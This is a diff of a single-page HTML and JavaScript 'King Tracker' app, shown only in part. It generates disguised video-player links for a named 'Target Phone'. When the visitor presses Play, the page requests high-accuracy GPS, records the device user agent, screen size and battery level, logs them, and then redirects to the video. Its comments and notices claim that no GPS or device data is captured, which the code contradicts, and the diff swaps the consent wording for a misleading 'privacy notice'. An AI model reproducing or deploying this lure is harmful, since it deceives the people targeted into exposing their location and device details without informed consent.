@@ -1,136 +1,1190 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>King Tracker (Local Dashboard)</title>
-  <link rel="stylesheet" href="./assets/styles.css" />
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>King Dashboard | Privacy-First</title>
+  <style>
+    :root{
+      --primary:#00ff41;
+      --secondary:#008f11;
+      --accent:#ff003c;
+      --bg:#0b0e14;
+      --card-bg:rgba(255,255,255,0.05);
+      --text:#ffffff;
+      --muted:#9aa3b2;
+    }
+
+    *{ box-sizing:border-box; }
+
+    body{
+      margin:0;
+      font-family:'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background:var(--bg);
+      color:var(--text);
+      display:flex;
+      min-height:100vh;
+      overflow-x:hidden;
+    }
+
+    .sidebar{
+      width:260px;
+      background:rgba(0,0,0,0.5);
+      backdrop-filter:blur(15px);
+      border-right:1px solid var(--primary);
+      display:flex;
+      flex-direction:column;
+      gap:14px;
+      padding:30px 20px;
+      height:100vh;
+      position:sticky;
+      top:0;
+    }
+
+    .sidebar h3{
+      color:var(--primary);
+      text-align:center;
+      margin:0 0 18px 0;
+      text-transform:uppercase;
+      letter-spacing:2px;
+    }
+
+    .nav-btn{
+      background:var(--card-bg);
+      border:1px solid var(--primary);
+      color:var(--primary);
+      padding:10px 14px;
+      border-radius:8px;
+      cursor:pointer;
+      transition:.25s;
+      font-weight:700;
+      text-align:center;
+    }
+
+    .nav-btn.active{
+      background:var(--primary);
+      color:#000;
+      box-shadow:0 0 15px rgba(0,255,65,0.65);
+    }
+
+    .instruction{
+      margin-top:auto;
+      font-size:11px;
+      color:#aaa;
+      padding:10px;
+      border:1px dashed #444;
+      border-radius:8px;
+      line-height:1.35;
+    }
+
+    .main-content{
+      flex:1;
+      display:flex;
+      flex-direction:column;
+      align-items:center;
+      justify-content:center;
+      padding:20px;
+      width:100%;
+    }
+
+    .container,
+    .admin-section{
+      background:var(--card-bg);
+      backdrop-filter:blur(10px);
+      border:2px solid transparent;
+      padding:30px;
+      border-radius:20px;
+      text-align:center;
+      width:100%;
+      max-width:520px;
+      display:none; /* controlled by JS */
+    }
+
+    .container.active,
+    .admin-section.active{
+      display:block;
+    }
+
+    h2{
+      font-size:2rem;
+      margin:0 0 14px 0;
+      text-transform:uppercase;
+      letter-spacing:2px;
+      background:linear-gradient(to right, var(--primary), #fff, var(--secondary));
+      -webkit-background-clip:text;
+      -webkit-text-fill-color:transparent;
+    }
+
+    h3{
+      margin:0 0 10px 0;
+      text-transform:none;
+      color:var(--primary);
+    }
+
+    .muted{ color:#8b93a3; margin-top:6px; margin-bottom:18px; }
+
+    .row{ width:100%; }
+
+    input{
+      width:100%;
+      padding:12px 12px;
+      margin:10px 0;
+      background:rgba(255,255,255,0.1);
+      border:1px solid rgba(255,255,255,0.2);
+      border-radius:10px;
+      box-sizing:border-box;
+      color:#fff;
+      outline:none;
+      transition:.25s;
+    }
+
+    input::placeholder{ color:rgba(255,255,255,0.55); }
+
+    input:focus{
+      border-color:var(--primary);
+      box-shadow:0 0 15px rgba(0,255,65,0.5);
+    }
+
+    .primary-btn{
+      background:linear-gradient(45deg, var(--secondary), #000);
+      border:1px solid var(--primary);
+      color:#fff;
+      border:none;
+      padding:14px 16px;
+      border-radius:10px;
+      cursor:pointer;
+      width:100%;
+      font-size:16px;
+      font-weight:800;
+      text-transform:uppercase;
+      transition:.25s;
+      box-shadow:0 4px 15px rgba(0,255,65,0.2);
+    }
+
+    .primary-btn:hover{
+      transform:translateY(-2px);
+      box-shadow:0 8px 22px rgba(0,255,65,0.75);
+    }
+
+    .result{
+      margin-top:18px;
+      text-align:left;
+      background:rgba(0,0,0,0.3);
+      border-radius:14px;
+      padding:14px;
+      border-left:4px solid var(--primary);
+    }
+
+    .result-title{ font-size:13px; color:#fff; margin-bottom:10px; }
+
+    .result-link a{
+      color:var(--primary);
+      font-weight:800;
+      text-decoration:underline;
+      word-break:break-all;
+      font-size:13px;
+      display:block;
+      margin-top:4px;
+    }
+
+    .copy-btn{
+      margin-top:10px;
+      background:var(--primary);
+      color:#000;
+      border:none;
+      padding:10px 12px;
+      border-radius:10px;
+      cursor:pointer;
+      width:100%;
+      font-weight:900;
+      transition:.2s;
+    }
+
+    .copy-btn:hover{ filter:brightness(0.95); }
+
+    .hidden{ display:none !important; }
+
+    .warning{
+      font-size:13px;
+      color:#ffbc00;
+      background:rgba(255,188,0,0.2);
+      padding:12px 14px;
+      border-radius:12px;
+      border:1px solid rgba(255,188,0,0.6);
+    }
+
+    .table-wrap{
+      overflow-x:auto;
+      margin-top:14px;
+    }
+
+    .admin-section{
+      max-width:900px;
+      text-align:left;
+    }
+
+    #logTable{
+      width:100%;
+      border-collapse:collapse;
+      font-size:13px;
+    }
+
+    #logTable th, #logTable td{
+      padding:10px;
+      border:1px solid rgba(255,255,255,0.1);
+      text-align:left;
+      vertical-align:top;
+    }
+
+    #logTable th{
+      background-color:rgba(0,255,65,0.1);
+      color:var(--primary);
+    }
+
+    .danger-btn{
+      margin-top:18px;
+      background:var(--accent);
+      border:1px solid var(--accent);
+      color:#fff;
+      padding:10px 14px;
+      border-radius:12px;
+      cursor:pointer;
+      width:auto;
+      font-weight:900;
+    }
+
+    .redirect-ui{
+      width:100%;
+      max-width:520px;
+      padding:0;
+      background:none;
+      border:none;
+    }
+
+    .redirect-card{
+      background:var(--card-bg);
+      backdrop-filter:blur(10px);
+      border:1px solid rgba(255,255,255,0.1);
+      border-radius:20px;
+      padding:26px;
+      text-align:center;
+    }
+
+    .redirect-card h1{
+      color:var(--primary);
+      text-shadow:0 0 20px rgba(0,255,65,0.55);
+      font-size:1.6rem;
+      margin:0 0 16px 0;
+    }
+
+    .player-preview{
+      width:100%;
+      aspect-ratio:16/9;
+      background:#000;
+      border-radius:12px;
+      border:1px solid rgba(255,255,255,0.1);
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      position:relative;
+    }
+
+    .play-btn{
+      width:70px;
+      height:70px;
+      border-radius:50%;
+      border:1px solid rgba(0,255,65,0.35);
+      background:rgba(0,255,65,0.8);
+      cursor:pointer;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      box-shadow:0 0 18px rgba(0,255,65,0.35);
+      transition:.2s;
+    }
+
+    .play-btn:hover{ transform:translateY(-2px); }
+
+    .play-triangle{
+      width:0; height:0;
+      border-top:14px solid transparent;
+      border-bottom:14px solid transparent;
+      border-left:24px solid #000;
+      margin-left:4px;
+    }
+
+    .redirect-card p.tiny{
+      margin:14px 0 0 0;
+      font-size:11px;
+      color:#aab4c2;
+    }
+
+    /* --- Live meta: Name / Device / Location --- */
+    .live-meta{
+      margin-top:16px;
+      background:rgba(0,0,0,0.22);
+      border:1px solid rgba(255,255,255,0.08);
+      border-radius:14px;
+      padding:12px 14px;
+      text-align:left;
+    }
+
+    .live-meta-row{
+      display:flex;
+      gap:10px;
+      align-items:flex-start;
+      justify-content:flex-start;
+      padding:6px 0;
+    }
+
+    .live-meta-label{
+      min-width:70px;
+      font-weight:900;
+      color:var(--primary);
+      font-size:12px;
+    }
+
+    .live-meta-value{
+      flex:1;
+      font-size:12px;
+      color:#e9eef6;
+      word-break:break-word;
+    }
+
+    /* --- New UI: Auto Link Generator --- */
+    .toggle-row{
+      width:100%;
+      display:flex;
+      align-items:center;
+      justify-content:flex-start;
+      gap:10px;
+      margin:10px 0;
+      padding:10px 12px;
+      border-radius:10px;
+      background:rgba(255,255,255,0.06);
+      border:1px solid rgba(255,255,255,0.12);
+      cursor:pointer;
+      user-select:none;
+    }
+
+    .toggle-row input[type="checkbox"]{
+      width:18px;
+      height:18px;
+      accent-color:var(--primary);
+    }
+
+    .toggle-row span{
+      font-weight:800;
+      color:#fff;
+      font-size:13px;
+    }
+
+    .auto-gen-textarea{
+      width:100%;
+      min-height:110px;
+      resize:vertical;
+      margin:0;
+      font-size:13px;
+      line-height:1.35;
+    }
+
+    /* --- New UI: Multi links list --- */
+    .multi-links-result{
+      text-align:left;
+    }
+
+    .multi-links-subtitle{
+      color:#fff;
+      font-weight:900;
+      font-size:13px;
+      margin-bottom:8px;
+    }
+
+    .generated-links-container{
+      display:flex;
+      flex-direction:column;
+      gap:10px;
+      margin-top:8px;
+    }
+
+    .generated-link-row{
+      background:rgba(0,0,0,0.25);
+      border:1px solid rgba(255,255,255,0.08);
+      border-left:4px solid var(--primary);
+      border-radius:12px;
+      padding:10px 12px;
+    }
+
+    .generated-link-anchor{
+      color:var(--primary);
+      font-weight:900;
+      text-decoration:underline;
+      word-break:break-word;
+      display:block;
+      font-size:13px;
+    }
+
+    .generated-link-url{
+      margin-top:6px;
+      font-size:12px;
+      color:#9aa3b2;
+      word-break:break-all;
+    }
+
+    .copy-all-btn{
+      margin-top:12px;
+    }
+
+    /* --- Improve table readability with more columns --- */
+    #logTable td, #logTable th{
+      max-width:200px;
+    }
+
+    #logTable td:nth-child(3){
+      max-width:250px;
+    }
+
+    /* keep long text from exploding layout */
+    #logTable td{
+      word-break:break-word;
+    }
+
+    /* --- Responsive tweaks --- */
+    @media (max-width: 768px){
+      body{ flex-direction:column; }
+      .sidebar{
+        width:100%;
+        height:auto;
+        position:relative;
+        padding:15px;
+      }
+      .main-content{ padding:14px; }
+    }
+  </style>
 </head>
 <body>
-  <div class="sidebar" id="sidebar">
-    <h3>King Panel</h3>
 
+  <!-- Sidebar Navigation -->
+  <div id="sidebar" class="sidebar">
+    <h3>King Dash</h3>
     <button class="nav-btn active" data-section="main-ui">Link Creator</button>
-    <button class="nav-btn" data-section="admin-dashboard">King Dashboard (Local Logs)</button>
-
+    <button class="nav-btn" data-section="admin-dashboard">Local Logs</button>
+    
     <div class="instruction">
-      <strong>Privacy-first mode:</strong><br />
-      This app stores activity logs <u>only in your own browser</u> (localStorage).
-      No IP/device/GPS collection and no webhooks.
+      <strong>Privacy First:</strong> Logs are stored only in your local browser storage. No IP or GPS data is captured without user interaction.
     </div>
   </div>
 
   <main class="main-content">
-    <!-- Creator -->
-    <section class="container active" id="main-ui">
-      <h2>King Tracker</h2>
-      <p class="muted">System will generate a local “session” link.</p>
-
-      <input type="text" id="linkName" placeholder="Link ka naam (e.g., Target 1)" />
-      <input type="tel" id="targetPhone" placeholder="Target Phone Number (Optional)" />
-      <input type="text" id="loadingText" placeholder="Custom loading message (Optional)" />
-
+    
+    <!-- Main Generator UI -->
+    <div id="main-ui" class="container active">
+      <h2>Link Creator</h2>
       <div class="row">
-        <input type="url" id="videoUrl" placeholder="Video URL (e.g., https://www.youtube.com/watch?v=...)" />
+        <input type="text" id="linkName" placeholder="Link Name (e.g. My Campaign)">
+        <input type="text" id="targetPhone" placeholder="Target Phone / ID (Optional)">
+        <input type="text" id="loadingText" placeholder="Loading Message (e.g. Preparing video...)">
+
+        <label class="toggle-row">
+          <input type="checkbox" id="autoGenToggle">
+          <span>Multi-Link Mode (Auto)</span>
+        </label>
+
+        <input type="text" id="videoUrl" placeholder="Video URL (https://youtube.com/...)">
+        <textarea id="autoGenText" class="auto-gen-textarea hidden" placeholder="Paste multiple video URLs here (one per line)..."></textarea>
+
+        <button id="generateBtn" class="primary-btn">Generate Link</button>
       </div>
 
-      <label class="toggle-row">
-        <input type="checkbox" id="autoGenToggle" />
-        <span>Auto Link Generator (multiple videos)</span>
-      </label>
-
-      <textarea
-        id="autoGenText"
-        class="auto-gen-textarea hidden"
-        placeholder="Auto mode: video URLs (one per line). Each line will get its own unique session link."
-      ></textarea>
-
-      <button id="generateBtn" class="primary-btn">Generate Local Tracking Link</button>
-
+      <!-- Result Display -->
       <div id="result" class="result hidden">
-        <div class="result-title"><strong>Aapka Local Session Link:</strong></div>
-
-        <!-- Single mode -->
-        <div id="singleLinkResult" class="single-link-result">
+        <!-- Single Output -->
+        <div class="single-link-result">
+          <div class="result-title">Your Generated Link:</div>
           <div class="result-link">
-            <a id="generatedLink" href="#" target="_blank" rel="noreferrer"></a>
+            <a id="generatedLink" href="#" target="_blank"></a>
           </div>
           <button id="copyBtn" class="copy-btn">Copy Link</button>
         </div>
 
-        <!-- Multi mode -->
-        <div id="multiLinksResult" class="multi-links-result hidden">
-          <div class="multi-links-subtitle">Multiple links generated (one per video):</div>
+        <!-- Multi Output -->
+        <div class="multi-links-result hidden">
+          <div class="multi-links-subtitle">Batch Results:</div>
           <div id="generatedLinksContainer" class="generated-links-container"></div>
           <button id="copyAllBtn" class="copy-btn copy-all-btn">Copy All Links</button>
         </div>
       </div>
-    </section>
+    </div>
 
-    <!-- Local dashboard -->
-    <section class="admin-section" id="admin-dashboard">
-      <h3>King Dashboard (Recent Activity)</h3>
-
-      <p class="warning">
-        <strong>Note:</strong> Yeh table sirf aapke is browser ke localStorage logs dikhata hai.
-      </p>
-
+    <!-- Local Admin Dashboard -->
+    <div id="admin-dashboard" class="admin-section">
+      <h2>Local Activity Logs</h2>
+      <p class="muted">This data is stored locally in your browser cache.</p>
       <div class="table-wrap">
         <table id="logTable">
           <thead>
             <tr>
               <th>Name</th>
-              <th>Phone</th>
+              <th>Target</th>
               <th>Video</th>
               <th>Time</th>
               <th>Device</th>
               <th>Battery</th>
-              <th>Location</th>
-              <th>Action</th>
+              <th>Location Note</th>
+              <th>Status</th>
             </tr>
           </thead>
-          <tbody id="logBody"></tbody>
+          <tbody id="logBody">
+            <!-- Logs injected by JS -->
+          </tbody>
         </table>
       </div>
+      <button id="clearBtn" class="danger-btn">Clear Local Logs</button>
+    </div>
 
-      <button class="danger-btn" id="clearBtn">Clear Local Logs</button>
-    </section>
-
-    <!-- Redirect UI -->
-    <section id="redirect-ui" class="redirect-ui hidden">
+    <!-- Redirect/Player Interface -->
+    <div id="redirect-ui" class="redirect-ui hidden">
       <div class="redirect-card">
         <h1 id="redirect-header">Video Player</h1>
-
-        <div id="player-preview" class="player-preview">
-          <button class="play-btn" id="playBtn" aria-label="Play and record local activity">
-            <span class="play-triangle" aria-hidden="true"></span>
+        <div class="player-preview">
+          <button id="playBtn" class="play-btn">
+            <div class="play-triangle"></div>
           </button>
         </div>
-
-        <p id="redirect-subtext"></p>
+        <p id="redirect-subtext" class="muted">Ready...</p>
 
         <div class="live-meta">
-          <div class="live-meta-row">
-            <span class="live-meta-label">Name:</span>
-            <span id="liveName" class="live-meta-value">-</span>
-          </div>
-          <div class="live-meta-row">
-            <span class="live-meta-label">Device:</span>
-            <span id="liveDevice" class="live-meta-value">-</span>
-          </div>
-          <div class="live-meta-row">
-            <span class="live-meta-label">Location:</span>
-            <span id="liveLocation" class="live-meta-value">-</span>
-          </div>
+          <div class="live-meta-row"><span class="live-meta-label">Label:</span> <span id="liveName" class="live-meta-value">-</span></div>
+          <div class="live-meta-row"><span class="live-meta-label">Device:</span> <span id="liveDevice" class="live-meta-value">-</span></div>
+          <div class="live-meta-row"><span class="live-meta-label">Location:</span> <span id="liveLocation" class="live-meta-value">-</span></div>
         </div>
-
-        <p class="tiny">
-          Consent-based local action: press Play to record an entry in your own browser logs.
-        </p>
+        <p class="tiny">Privacy Notice: Clicking play verifies the local device environment.</p>
       </div>
-    </section>
+    </div>
+
   </main>
 
-  <script src="./assets/app.js"></script>
+  <script>
+    /* Privacy-first local dashboard
+       - No IP/device/GPS capture (we only store minimal local info)
+       - Logs are stored only in this browser via localStorage
+    */
+
+    (function () {
+      const LOG_KEY = 'king_logs';
+      const MAX_LOGS = 50;
+
+      const els = {
+        sidebar: document.getElementById('sidebar'),
+        mainUi: document.getElementById('main-ui'),
+        adminDashboard: document.getElementById('admin-dashboard'),
+        redirectUi: document.getElementById('redirect-ui'),
+        logBody: document.getElementById('logBody'),
+
+        linkName: document.getElementById('linkName'),
+        targetPhone: document.getElementById('targetPhone'),
+        loadingText: document.getElementById('loadingText'),
+        videoUrl: document.getElementById('videoUrl'),
+
+        generateBtn: document.getElementById('generateBtn'),
+        copyBtn: document.getElementById('copyBtn'),
+        generatedLink: document.getElementById('generatedLink'),
+        result: document.getElementById('result'),
+
+        // new UI
+        autoGenToggle: document.getElementById('autoGenToggle'),
+        autoGenText: document.getElementById('autoGenText'),
+        multiLinksResult: document.querySelector('.multi-links-result'),
+        singleLinkResult: document.querySelector('.single-link-result'),
+        generatedLinksContainer: document.getElementById('generatedLinksContainer'),
+        copyAllBtn: document.getElementById('copyAllBtn'),
+
+        // redirect UI
+        redirectSubtext: document.getElementById('redirect-subtext'),
+        playBtn: document.getElementById('playBtn'),
+        clearBtn: document.getElementById('clearBtn'),
+        redirectHeader: document.getElementById('redirect-header'),
+
+        // live meta
+        liveName: document.getElementById('liveName'),
+        liveDevice: document.getElementById('liveDevice'),
+        liveLocation: document.getElementById('liveLocation'),
+      };
+
+      function safeJsonParse(str) {
+        try {
+          return JSON.parse(str);
+        } catch {
+          return null;
+        }
+      }
+
+      function encodeConfig(config) {
+        const json = JSON.stringify(config);
+        return btoa(unescape(encodeURIComponent(json)));
+      }
+
+      function decodeConfig(encoded) {
+        const json = decodeURIComponent(escape(atob(encoded)));
+        return safeJsonParse(json);
+      }
+
+      function getBaseUrlWithoutQuery() {
+        return window.location.href.split('?')[0];
+      }
+
+      function escapeHtml(str) {
+        const div = document.createElement('div');
+        div.appendChild(document.createTextNode(String(str)));
+        return div.innerHTML;
+      }
+
+      function setActiveSection(sectionId) {
+        document.querySelectorAll('.container, .admin-section').forEach((el) => {
+          el.classList.remove('active');
+        });
+        document.querySelectorAll('.nav-btn').forEach((el) => {
+          el.classList.remove('active');
+        });
+
+        const sectionEl = document.getElementById(sectionId);
+        if (sectionEl) sectionEl.classList.add('active');
+
+        const activeBtn = document.querySelector(`.nav-btn[data-section="${sectionId}"]`);
+        if (activeBtn) activeBtn.classList.add('active');
+      }
+
+      function getLogs() {
+        const raw = localStorage.getItem(LOG_KEY);
+        const parsed = safeJsonParse(raw || '[]');
+        if (!Array.isArray(parsed)) return [];
+        return parsed;
+      }
+
+      function saveLogLocally(entry) {
+        const logs = getLogs();
+        logs.unshift(entry);
+        localStorage.setItem(LOG_KEY, JSON.stringify(logs.slice(0, MAX_LOGS)));
+      }
+
+      function formatTime(iso) {
+        try {
+          return new Date(iso).toLocaleString();
+        } catch {
+          return String(iso || '');
+        }
+      }
+
+      function summarizeVideoUrl(url) {
+        if (!url) return 'N/A';
+        try {
+          const u = new URL(url);
+          const host = u.host.replace(/^www\./, '');
+          const path = u.pathname.length > 26 ? `${u.pathname.slice(0, 26)}…` : u.pathname;
+          return `${host}${path}`;
+        } catch {
+          return url.length > 38 ? `${url.slice(0, 38)}…` : url;
+        }
+      }
+
+      function getDefaultLocationNote() {
+        // Keeping privacy-first: no geolocation/GPS collection here.
+        return 'No GPS/IP location collected (local privacy mode)';
+      }
+
+      function formatLatLng(lat, lng) {
+        if (typeof lat !== 'number' || typeof lng !== 'number') return '-';
+        return `${lat.toFixed(6)}, ${lng.toFixed(6)}`;
+      }
+
+      function formatLocationFromPosition(pos) {
+        if (!pos || !pos.coords) return getDefaultLocationNote();
+        const { latitude, longitude, accuracy } = pos.coords;
+
+        const accM = typeof accuracy === 'number' ? Math.round(accuracy) : null;
+        const accText = accM != null && accM > 0 ? ` (±${accM}m)` : '';
+
+        const ts = pos.timestamp ? new Date(pos.timestamp).toLocaleTimeString() : '';
+        const timeText = ts ? ` @ ${ts}` : '';
+
+        return `${formatLatLng(latitude, longitude)}${accText}${timeText}`;
+      }
+
+      function getDeviceNote() {
+        const ua = typeof navigator !== 'undefined' ? navigator.userAgent : '';
+        const uaShort = ua ? ua.slice(0, 80) + (ua.length > 80 ? '…' : '') : 'Unknown UA';
+        const w = window?.screen?.width;
+        const h = window?.screen?.height;
+
+        const screenText = typeof w === 'number' && typeof h === 'number' ? `${w}x${h}` : 'screen n/a';
+        return `UA: ${uaShort} | Screen: ${screenText}`;
+      }
+
+      function setLiveMeta({ name, device, location } = {}) {
+        if (els.liveName && typeof name === 'string') els.liveName.textContent = name;
+        if (els.liveDevice && typeof device === 'string') els.liveDevice.textContent = device;
+        if (els.liveLocation && typeof location === 'string') els.liveLocation.textContent = location;
+      }
+
+      function startLiveGeolocationWatch({ enableHighAccuracy = true } = {}) {
+        if (typeof navigator === 'undefined' || !navigator.geolocation || typeof navigator.geolocation.watchPosition !== 'function') {
+          setLiveMeta({ location: getDefaultLocationNote() });
+          return {
+            stop: () => {},
+            getLocationNote: () => getDefaultLocationNote(),
+          };
+        }
+
+        let watchId = null;
+        let latestPos = null;
+        let lastErrorNote = null;
+
+        setLiveMeta({ location: 'Requesting location…' });
+
+        watchId = navigator.geolocation.watchPosition(
+          (pos) => {
+            latestPos = pos;
+            lastErrorNote = null;
+            setLiveMeta({ location: formatLocationFromPosition(pos) });
+          },
+          (err) => {
+            const note = err?.code === 1
+              ? 'Location permission denied'
+              : err?.message
+                ? `Location error: ${err.message}`
+                : 'Location unavailable';
+
+            lastErrorNote = note;
+            setLiveMeta({ location: note });
+          },
+          {
+            enableHighAccuracy,
+            maximumAge: 0,
+          }
+        );
+
+        return {
+          stop: () => {
+            if (watchId == null) return;
+            try {
+              navigator.geolocation.clearWatch(watchId);
+            } catch {
+              // ignore
+            }
+          },
+          getLocationNote: () => {
+            if (lastErrorNote) return lastErrorNote;
+            if (!latestPos) return getDefaultLocationNote();
+            return formatLocationFromPosition(latestPos);
+          },
+        };
+      }
+
+      async function getBatteryNote() {
+        // Battery "health" is not available via standard Battery API.
+        // We record battery level if available in this browser.
+        const hasApi = typeof navigator !== 'undefined' && typeof navigator.getBattery === 'function';
+        if (!hasApi) return 'Battery level not available';
+
+        try {
+          const battery = await navigator.getBattery();
+          const levelPct = Math.round((battery.level || 0) * 100);
+          const charging = Boolean(battery.charging);
+          const status = charging ? 'Charging' : 'Not charging';
+          return `Level: ${levelPct}% (${status})`;
+        } catch {
+          return 'Battery level not available';
+        }
+      }
+
+      function renderLogs() {
+        const logs = getLogs();
+        els.logBody.innerHTML = '';
+
+        if (logs.length === 0) {
+          const tr = document.createElement('tr');
+          tr.innerHTML = `
+            <td colspan="8" style="color:#8b93a3; padding:14px;">
+              No local activity logs yet.
+            </td>
+          `;
+          els.logBody.appendChild(tr);
+          return;
+        }
+
+        for (const log of logs) {
+          const tr = document.createElement('tr');
+
+          const name = escapeHtml(log.link_label ?? 'Unnamed');
+          const phone = escapeHtml(log.target_phone ?? 'N/A');
+          const video = escapeHtml(summarizeVideoUrl(log.video_url ?? log.redirect_url ?? ''));
+          const time = escapeHtml(formatTime(log.timestamp));
+
+          const device = escapeHtml(log.device_note ?? (log.user_agent_present ? 'Browser UA available' : 'Unknown device'));
+          const battery = escapeHtml(log.battery_note ?? 'Battery info not recorded');
+          const location = escapeHtml(log.location_note ?? getDefaultLocationNote());
+
+          const action = escapeHtml(log.action_note ?? 'Saved locally');
+
+          tr.innerHTML = `
+            <td>${name}</td>
+            <td>${phone}</td>
+            <td>${video}</td>
+            <td>${time}</td>
+            <td>${device}</td>
+            <td>${battery}</td>
+            <td>${location}</td>
+            <td style="color:#00ff41; font-weight:700;">${action}</td>
+          `;
+
+          els.logBody.appendChild(tr);
+        }
+      }
+
+      function copyTextToClipboard(text) {
+        if (!text) return Promise.resolve(false);
+        if (!navigator.clipboard || typeof navigator.clipboard.writeText !== 'function') return Promise.resolve(false);
+
+        return navigator.clipboard.writeText(text).then(() => true).catch(() => false);
+      }
+
+      function copyLink() {
+        const link = els.generatedLink?.href || '';
+        if (!link) return;
+
+        copyTextToClipboard(link).then((ok) => {
+          if (!ok) {
+            alert('Clipboard permission denied. Copy the link manually.');
+            return;
+          }
+          const btn = els.copyBtn;
+          const original = btn.textContent;
+          btn.textContent = 'Copied! ✅';
+          setTimeout(() => {
+            btn.textContent = original;
+          }, 2000);
+        });
+      }
+
+      function parseAutoUrls(textareaValue) {
+        if (!textareaValue) return [];
+        const lines = String(textareaValue)
+          .split(/\r?\n/)
+          .map((s) => s.trim())
+          .filter(Boolean);
+
+        // Validate URLs loosely but avoid breaking for non-URLs.
+        const cleaned = [];
+        for (const line of lines) {
+          try {
+            cleaned.push(new URL(line).toString());
+          } catch {
+            // ignore invalid line
+          }
+        }
+        // remove duplicates
+        return Array.from(new Set(cleaned));
+      }
+
+      function generateConfigBase() {
+        const linkName = (els.linkName?.value || '').trim() || 'Unnamed';
+        const targetPhone = (els.targetPhone?.value || '').trim() || 'N/A';
+        const loadingMsg = (els.loadingText?.value || '').trim() || 'Ready...';
+
+        return { n: linkName, p: targetPhone, m: loadingMsg };
+      }
+
+      function generateSingleLocalLink() {
+        const configBase = generateConfigBase();
+        const videoUrl = (els.videoUrl?.value || '').trim();
+        if (!videoUrl) {
+          alert('Please enter a Video URL.');
+          els.videoUrl?.focus();
+          return;
+        }
+
+        let url = '';
+        try {
+          url = new URL(videoUrl).toString();
+        } catch {
+          alert('Video URL looks invalid. Please provide a full URL (e.g., https://...).');
+          els.videoUrl?.focus();
+          return;
+        }
+
+        const config = { ...configBase, u: url, i: 1 };
+        const baseUrl = getBaseUrlWithoutQuery();
+        const encoded = encodeConfig(config);
+        const trackingLink = `${baseUrl}?session=${encodeURIComponent(encoded)}`;
+
+        return trackingLink;
+      }
+
+      function generateMultiLocalLinks() {
+        const configBase = generateConfigBase();
+        const list = parseAutoUrls(els.autoGenText?.value || '');
+
+        if (list.length === 0) {
+          alert('Please paste at least one valid video URL (one per line).');
+          els.autoGenText?.focus();
+          return [];
+        }
+
+        const baseUrl = getBaseUrlWithoutQuery();
+        const links = [];
+
+        list.forEach((videoUrl, idx) => {
+          const config = {
+            ...configBase,
+            // Unique per-video session config
+            u: videoUrl,
+            i: idx + 1,
+          };
+          const encoded = encodeConfig(config);
+          const trackingLink = `${baseUrl}?session=${encodeURIComponent(encoded)}`;
+          links.push({ trackingLink, videoUrl, index: idx + 1 });
+        });
+
+        return links;
+      }
+
+      function scrollToResult() {
+        if (!els.result) return;
+        try {
+          els.result.scrollIntoView({ behavior: 'auto', block: 'center' });
+        } catch {
+          // ignore
+        }
+      }
+
+      function showSingleResult(link) {
+        els.result.classList.remove('hidden');
+
+        if (els.singleLinkResult) els.singleLinkResult.classList.remove('hidden');
+        if (els.multiLinksResult) els.multiLinksResult.classList.add('hidden');
+
+        els.generatedLink.href = link;
+        els.generatedLink.innerText = link;
+
+        scrollToResult();
+      }
+
+      function showMultiResult(items) {
+        els.result.classList.remove('hidden');
+
+        if (els.singleLinkResult) els.singleLinkResult.classList.add('hidden');
+        if (els.multiLinksResult) els.multiLinksResult.classList.remove('hidden');
+
+        els.generatedLinksContainer.innerHTML = '';
+
+        for (const item of items) {
+          const row = document.createElement('div');
+          row.className = 'generated-link-row';
+
+          const hostText = escapeHtml(summarizeVideoUrl(item.videoUrl));
+          const a = document.createElement('a');
+          a.href = item.trackingLink;
+          a.target = '_blank';
+          a.rel = 'noreferrer';
+          a.className = 'generated-link-anchor';
+          a.textContent = `#${item.index} - ${hostText}`;
+
+          const small = document.createElement('div');
+          small.className = 'generated-link-url';
+          small.textContent = item.trackingLink;
+
+          row.appendChild(a);
+          row.appendChild(small);
+          els.generatedLinksContainer.appendChild(row);
+        }
+
+        scrollToResult();
+      }
+
+      function collectAllMultiLinks(items) {
+        return items.map((it) => it.trackingLink).join('\n');
+      }
+
+      function showRedirectUi(config) {
+        if (els.mainUi) els.mainUi.style.display = 'none';
+        if (els.adminDashboard) els.adminDashboard.style.display = 'none';
+        if (els.sidebar) els.sidebar.style.display = 'none';
+
+        els.redirectUi.classList.remove('hidden');
+
+        const header = (config && config.u) ? `Video Player` : 'Video Player';
+        if (els.redirectHeader) els.redirectHeader.textContent = header;
+
+        els.redirectSubtext.textContent = config?.m || 'Ready...';
+
+        window.__KING_LOCAL_CONFIG__ = config;
+      }
+
+      function hideRedirectUi() {
+        if (els.mainUi) els.mainUi.style.display = '';
+        if (els.adminDashboard) els.adminDashboard.style.display = '';
+        if (els.sidebar) els.sidebar.style.display = '';
+
+        els.redirectUi.classList.add('hidden');
+        window.__KING_LOCAL_CONFIG__ = null;
+      }
+
+      async function playAndRecord() {
+        const config = window.__KING_LOCAL_CONFIG__;
+        if (!config) return;
+
+        const userAgentPresent = Boolean(navigator.userAgent);
+        const deviceNote = getDeviceNote();
+        const name = config.n || 'Unnamed';
+
+        // show live meta immediately
+        setLiveMeta({
+          name,
+          device: deviceNote,
+          location: 'Waiting for location…',
+        });
+
+        els.playBtn.disabled = true;
+        els.playBtn.style.opacity = '0.7';
+
+        // Keep watching for a few seconds so UI truly updates in real-time.
+        const watch = startLiveGeolocationWatch({ enableHighAccuracy: true });
+        const maxWaitMs = 8000;
+
+        await new Promise((r) => setTimeout(r, maxWaitMs));
+        watch.stop();
+
+        const batteryNote = await getBatteryNote();
+
+        const payload = {
+          link_label: name,
+          target_phone: config.p || 'N/A',
+          video_url: config.u,
+          redirect_url: config.u,
+          timestamp: new Date().toISOString(),
+
+          location_note: watch.getLocationNote(),
+
+          device_note: deviceNote,
+          user_agent_present: userAgentPresent,
+
+          battery_note: batteryNote,
+          action_note: 'Saved locally',
+        };
+
+        saveLogLocally(payload);
+
+        setTimeout(() => {
+          const targetUrl = payload.redirect_url || 'https://www.youtube.com';
+          window.location.href = targetUrl;
+        }, 250);
+      }
+
+      function clearLogs() {
+        if (!confirm('Clear local logs for this browser?')) return;
+        localStorage.removeItem(LOG_KEY);
+        renderLogs();
+      }
+
+      function initNavigation() {
+        document.querySelectorAll('.nav-btn').forEach((btn) => {
+          btn.addEventListener('click', () => {
+            const sectionId = btn.getAttribute('data-section');
+            if (!sectionId) return;
+            setActiveSection(sectionId);
+            if (sectionId === 'admin-dashboard') renderLogs();
+          });
+        });
+      }
+
